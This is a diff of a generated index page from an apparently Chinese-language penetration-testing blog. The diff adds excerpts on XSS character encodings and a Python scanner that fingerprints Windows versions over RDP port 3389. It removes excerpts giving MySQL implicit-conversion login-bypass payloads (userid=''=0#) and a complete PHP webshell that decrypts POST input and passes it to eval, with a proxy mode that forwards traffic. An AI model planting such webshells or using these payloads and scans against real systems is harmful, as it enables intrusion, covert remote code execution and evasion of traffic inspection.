@@ -117,6 +117,298 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/03/02/xss-encode-decode.html" >xss基础编码</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-03-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
+<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
+1. HTML Decoding
+2. URL Decoding
+3. Javascript Decoding
+
+http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>三种编码，对于html来说是(10进制和16进制）</p>
+<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
+<li>十进制：<code>&amp;#60;</code> </li>
+<li>html十六: <code>&amp;#x3c;</code></li>
+</ul>
+<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
+<ul>
+<li>八进制:<code>\74</code> </li>
+<li>十六进制: <code>\x3c</code></li>
+<li>unicode编码: <code>\u003c</code></li>
+</ul>
+<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
+<li>url: %3C </li>
+<li>base64: PA==</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
+<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
+1. HTML Decoding
+2. URL Decoding
+3. Javascript Decoding
+
+http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>三种编码，对于html来说是(10进制和16进制）</p>
+<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
+<li>十进制：<code>&amp;#60;</code> </li>
+<li>html十六: <code>&amp;#x3c;</code></li>
+</ul>
+<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
+<ul>
+<li>八进制:<code>\74</code> </li>
+<li>十六进制: <code>\x3c</code></li>
+<li>unicode编码: <code>\u003c</code></li>
+</ul>
+<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
+<li>url: %3C </li>
+<li>base64: PA==</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/02/28/3389-scan.html" >3389指纹扫描</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-02-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
+<ul>
+<li>TCP三次握手</li>
+<li>客户端发送COTP协议</li>
+<li>服务端发送TPKT</li>
+</ul>
+<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
+<p>最后的python脚本是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+# coding: utf-8
+
+import socket
+import binascii
+import sys
+import threading
+from Queue import Queue
+
+
+def verify(sock, port):
+	while 1:
+		buff &#x3D; sock.recv(2048)
+		if not buff:
+			break
+		b &#x3D; bytearray(buff)
+		print &quot;[+] %s&quot; % binascii.hexlify(b)
+		detect_os(binascii.hexlify(b), port)
+		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
+		# 	print &quot;[+] RDP Port is %s&quot; % port
+		# 	sys.exit(0)
+
+
+def detect_os(res, port):
+	d &#x3D; &#123;
+		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
+		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
+		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
+		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
+		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
+		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
+	&#125;
+	for key, value in d.iteritems():
+		if value &#x3D;&#x3D; res:
+			print &quot;[+] Os May be: %s&quot; % key
+			print &quot;[+] RDP Port is %s&quot; % port
+			sys.exit(0)
+def send_payload(sock):
+	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
+
+
+def worker():
+	while not q.empty():
+		port &#x3D; q.get()
+		try:
+			scan(port)
+		finally:
+			q.task_done()
+
+
+def scan(port):
+	try:
+		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(2)
+		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
+		sys.stdout.flush()
+		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
+			print &quot;[+] Connect Success %s&quot; % port
+			send_payload(s)
+			verify(s, port)
+	except Exception, e:
+		# raise e
+		pass
+	s.close()
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	if len(sys.argv) !&#x3D; 2:
+		print &quot;Usage: %s IP&quot; % sys.argv[0]
+		sys.exit(0)
+	ip &#x3D; sys.argv[1]
+	q &#x3D; Queue()
+	map(q.put, xrange(3300, 65535))
+	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
+	map(lambda x: x.start(), threads)
+	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	
+
+	</div>
+  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
+<ul>
+<li>TCP三次握手</li>
+<li>客户端发送COTP协议</li>
+<li>服务端发送TPKT</li>
+</ul>
+<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
+<p>最后的python脚本是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+# coding: utf-8
+
+import socket
+import binascii
+import sys
+import threading
+from Queue import Queue
+
+
+def verify(sock, port):
+	while 1:
+		buff &#x3D; sock.recv(2048)
+		if not buff:
+			break
+		b &#x3D; bytearray(buff)
+		print &quot;[+] %s&quot; % binascii.hexlify(b)
+		detect_os(binascii.hexlify(b), port)
+		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
+		# 	print &quot;[+] RDP Port is %s&quot; % port
+		# 	sys.exit(0)
+
+
+def detect_os(res, port):
+	d &#x3D; &#123;
+		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
+		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
+		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
+		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
+		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
+		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
+	&#125;
+	for key, value in d.iteritems():
+		if value &#x3D;&#x3D; res:
+			print &quot;[+] Os May be: %s&quot; % key
+			print &quot;[+] RDP Port is %s&quot; % port
+			sys.exit(0)
+def send_payload(sock):
+	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
+
+
+def worker():
+	while not q.empty():
+		port &#x3D; q.get()
+		try:
+			scan(port)
+		finally:
+			q.task_done()
+
+
+def scan(port):
+	try:
+		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(2)
+		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
+		sys.stdout.flush()
+		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
+			print &quot;[+] Connect Success %s&quot; % port
+			send_payload(s)
+			verify(s, port)
+	except Exception, e:
+		# raise e
+		pass
+	s.close()
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	if len(sys.argv) !&#x3D; 2:
+		print &quot;Usage: %s IP&quot; % sys.argv[0]
+		sys.exit(0)
+	ip &#x3D; sys.argv[1]
+	q &#x3D; Queue()
+	map(q.put, xrange(3300, 65535))
+	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
+	map(lambda x: x.start(), threads)
+	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	
+	</div>
+  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/02/16/ssh-port-forward.html" >SSH端口转发</a>
 		</h3>
 		</div>
@@ -481,214 +773,6 @@ window.onload &#x3D; a();
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/01/05/SQL隐形转换绕过waf.html" >SQL隐形弱类型转换绕过</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-01-05  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
-<p>如果PHP语句中存在这样的登录漏洞比如：</p>
-<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
-<p>但是在登录框处限制了用户名长度</p>
-<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
-print &quot;用户名不能超过4个字符串&quot;;
-echo $user;
-echo strlen($user);
-die();
-&#125;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p>
-<p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
-<p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
-<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
-<p>基本原理就是上面文章提到的：</p>
-	
-
-	</div>
-  <a type="button" href="/2017/01/05/SQL隐形转换绕过waf.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
-<p>如果PHP语句中存在这样的登录漏洞比如：</p>
-<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
-<p>但是在登录框处限制了用户名长度</p>
-<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
-print &quot;用户名不能超过4个字符串&quot;;
-echo $user;
-echo strlen($user);
-die();
-&#125;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>如果未做限制的情况下可以构造这样的语句<br><code>select * from users where userid = 1 or 1=1</code></p>
-<p>在限制的情况下可以利用sql隐形转换这样子：<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
-<p>这个就全部选择出来了，然后重要的点在后面<code>userid=&#39;&#39;=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
-<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
-<p>基本原理就是上面文章提到的：</p>
-	
-	</div>
-  <a type="button" href="/2017/01/05/SQL隐形转换绕过waf.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/01/04/加密webshell流量.html" >加密webshell流量</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-01-04  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-function easy_en($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
-        else $new &#x3D; $old -1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-function easy_de($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
-        else $new &#x3D; $old + 1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
-    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-&#x2F;&#x2F;    var_dump($c);
-    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
-        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
-        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
-        &#39;content&#39;&#x3D;&gt;$c),
-    ));
-    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
-&#x2F;&#x2F;    var_dump($c);
-    die(easy_de(base64_decode($c)));
-&#125;
-
-function shutdown() &#123;
-    $str &#x3D; ob_get_contents();
-    ob_end_clean();
-    echo base64_encode(easy_en($str));
-&#125;
-
-register_shutdown_function(&quot;shutdown&quot;);
-ob_start();
-$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
-eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
-?&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-function easy_en($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
-        else $new &#x3D; $old -1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-function easy_de($str) &#123;
-    $ret &#x3D; &quot;&quot;;
-    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
-        $old &#x3D; ord($str[$i]);
-        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
-        else $new &#x3D; $old + 1;
-        $ret .&#x3D; chr($new);
-    &#125;
-    return $ret;
-&#125;
-
-if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
-    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-&#x2F;&#x2F;    var_dump($c);
-    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
-        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
-        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
-        &#39;content&#39;&#x3D;&gt;$c),
-    ));
-    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
-&#x2F;&#x2F;    var_dump($c);
-    die(easy_de(base64_decode($c)));
-&#125;
-
-function shutdown() &#123;
-    $str &#x3D; ob_get_contents();
-    ob_end_clean();
-    echo base64_encode(easy_en($str));
-&#125;
-
-register_shutdown_function(&quot;shutdown&quot;);
-ob_start();
-$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
-parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
-eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
-?&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -738,7 +822,7 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
 		
 			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
 		
-			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
 		
 			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
@@ -746,7 +830,7 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -767,6 +851,14 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
+      </li>
+    
+      <li>
         <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
       </li>
     
@@ -776,14 +868,6 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
     
       <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
   </ul>
@@ -801,7 +885,7 @@ eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2022 JKme's Blog
+  &copy; 2023 JKme's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
